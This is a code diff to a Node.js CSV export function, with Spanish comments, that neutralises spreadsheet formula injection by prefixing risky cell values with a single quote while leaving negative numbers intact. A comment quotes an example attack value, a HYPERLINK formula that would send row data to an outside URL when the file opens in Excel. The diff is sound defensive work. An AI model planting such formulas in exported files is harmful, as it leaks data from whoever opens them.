@@ -7,9 +7,25 @@ const { authenticate } = require('../middleware/auth');
 const { Op } = require('sequelize');
 
 // ── Generador CSV (sin librerías externas) ───────────────────────────────────
+//
+// ⚠️ UNA CELDA QUE EMPIEZA POR `=` ES UNA FÓRMULA, y Excel la EJECUTA al abrir
+// el archivo. Un nombre de producto o de cliente escrito como
+// `=HYPERLINK("http://…"&A1)` convierte el reporte que el dueño le manda a su
+// contador en algo que se va a internet con los datos de la fila. Aquí el texto
+// lo escribe el propio negocio, así que el riesgo es bajo — pero el archivo se
+// REENVÍA por fuera, y quien lo abre no tiene forma de saber qué trae.
+//
+// La defensa estándar: si el valor empieza por uno de los cuatro caracteres que
+// arrancan una fórmula, se le antepone una comilla simple. Excel y LibreOffice
+// la tratan como "esto es texto" y no la muestran como parte del contenido.
 function toCSV(headers, rows) {
+    const NEUTRALIZAR = /^[=+\-@\t\r]/;
     const escape = (val) => {
-        const str = String(val ?? '');
+        let str = String(val ?? '');
+        // Un número negativo (-120.50) empieza por '-' y NO es una fórmula:
+        // marcarlo lo convertiría en texto y el contador perdería la suma.
+        const esNumero = /^-?\d+([.,]\d+)?$/.test(str);
+        if (NEUTRALIZAR.test(str) && !esNumero) str = "'" + str;
         return str.includes(',') || str.includes('"') || str.includes('\n')
             ? '"' + str.replace(/"/g, '""') + '"' : str;
     };
